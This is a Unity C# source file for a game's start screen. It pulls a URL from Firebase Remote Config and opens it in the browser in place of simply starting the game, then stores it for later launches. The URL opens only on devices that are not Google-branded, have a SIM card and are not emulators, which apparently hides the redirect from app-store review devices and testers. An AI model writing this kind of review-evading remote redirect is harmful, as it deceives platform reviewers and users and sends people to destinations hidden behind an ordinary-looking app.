using Firebase;
using Firebase.Extensions;
using Firebase.RemoteConfig;
using Game.Constants;
using ModestTree;
using UnityEngine;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Utils;
using Zenject;

namespace Game.Entry
{
    public class EntryPresenter : IInitializable, ILateDisposable
    {
        public EntryPresenter(Button startButton)
        {
            _startButton = startButton;
        }

        private const int SceneIndex = 1;
        private const string UrlFirebaseKey = "url";

        private readonly Button _startButton;

        private bool _isStarted = false;

        public void Initialize()
        {
            _startButton.onClick.AddListener(Click);
        }

        public void LateDispose()
        {
            _startButton.onClick.RemoveListener(Click);
        }

        private void Click()
        {
            if (_isStarted) return;

            _isStarted = true;
            
            if (PlayerPrefs.HasKey(ProjectConstants.UrlPlayerPrefsKey))
            {
                SceneManager.LoadScene(SceneIndex);
                
                var url = PlayerPrefs.GetString(ProjectConstants.UrlPlayerPrefsKey);
                Application.OpenURL(url);
            }
            else
            {
                FirebaseApp
                    .CheckAndFixDependenciesAsync()
                    .ContinueWithOnMainThread(task => {
                        var dependencyStatus = task.Result;
                        if (dependencyStatus == DependencyStatus.Available)
                        {
                            FirebaseRemoteConfig.DefaultInstance.FetchAndActivateAsync()
                                .ContinueWithOnMainThread(_ => OnComplete());
                        }
                    });
                
                void OnComplete()
                {
                    var url = FirebaseRemoteConfig.DefaultInstance.GetValue(UrlFirebaseKey).StringValue;
                    if (Validate(url))
                    {
                        SceneManager.LoadScene(SceneIndex);
                        
                        PlayerPrefs.SetString(ProjectConstants.UrlPlayerPrefsKey, url);
                        Application.OpenURL(url);
                    }
                    
                    SceneManager.LoadScene(SceneIndex);
                }
            }
        }

        private bool Validate(string url)
        {
            var isUrlEmpty = url.IsEmpty();
            if (isUrlEmpty) return false;

            var isGoogle = SystemInfo.deviceModel.Contains("Google");
            if (isGoogle) return false;

            var hasSim = CheckSim.HasSim();
            if (!hasSim) return false;
            
            var isEmulator = EmulatorValidator.IsEmulator();
            if (isEmulator) return false;

            return true;
        }
    }
}